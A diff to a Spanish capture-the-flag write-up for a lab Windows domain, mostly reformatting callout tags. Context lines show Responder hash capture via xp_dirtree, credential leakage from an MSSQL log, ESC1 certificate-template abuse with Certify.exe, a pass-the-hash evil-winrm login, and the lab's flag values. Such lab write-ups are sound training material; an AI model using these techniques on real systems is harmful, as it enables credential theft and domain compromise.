@@ -70,7 +70,7 @@ responder -I tun0 -v
 
 Luego, desde la sesión de MSSQL, ejecuté el procedimiento almacenado `xp_dirtree` apuntando a una ruta UNC (Universal Naming Convention) que dirigía a mi máquina.
 
-> [!NOTE] Técnica de captura de hash con xp_dirtree
+> [!note] Técnica de captura de hash con xp_dirtree
 > 
 > El procedimiento xp_dirtree se utiliza para listar el contenido de un directorio. Cuando se le proporciona una ruta UNC (como \\<mi_ip>\share), el servidor MSSQL intentará conectarse a ese recurso compartido. Este intento de conexión inicia un proceso de autenticación NTLM con mi máquina, lo que permite que una herramienta como Responder capture el hash de la cuenta de servicio que ejecuta MSSQL.
 
@@ -105,7 +105,7 @@ ls C:\users
 
 Continué enumerando y encontré un archivo de log del servicio MSSQL en `C:\sqlserver\Logs\ERRORLOG.bak`. Al inspeccionarlo, descubrí un intento de inicio de sesión fallido del usuario `ryan.cooper` que revelaba una posible contraseña.
 
-> [!TIP] Fuga de credenciales en logs
+> [!tip] Fuga de credenciales en logs
 > 
 > type C:\sqlserver\Logs\ERRORLOG.bak
 > 
@@ -139,7 +139,7 @@ La herramienta confirmó que existía una CA llamada `sequel-dc-ca`. El siguient
 
 El resultado de `Certify.exe` fue revelador: encontré una plantilla vulnerable llamada `UserAuthentication`.
 
-> [!DANGER] Vulnerabilidad ESC1: Suplantación de identidad
+> [!danger] Vulnerabilidad ESC1: Suplantación de identidad
 > 
 > La plantilla UserAuthentication era vulnerable a un ataque conocido como ESC1. Esta vulnerabilidad se produce por una combinación peligrosa de permisos:
 > 
@@ -180,10 +180,10 @@ evil-winrm -i sequel.htb -u administrator -H <HASH_NTLM_ADMINISTRADOR>
 
 ## Bandera(s)
 
-> [!FLAG] `flag{user}`
+> [!flag] `flag{user}`
 > 9d6a7558c8ed329ed3170b876019f2ca
-^bandera
+^bandera-user
 
-> [!FLAG] `flag{root}`
+> [!flag] `flag{root}`
 > 2d7c05880dfd5ab71bec348c7b32877a
-^bandera
+^bandera-root
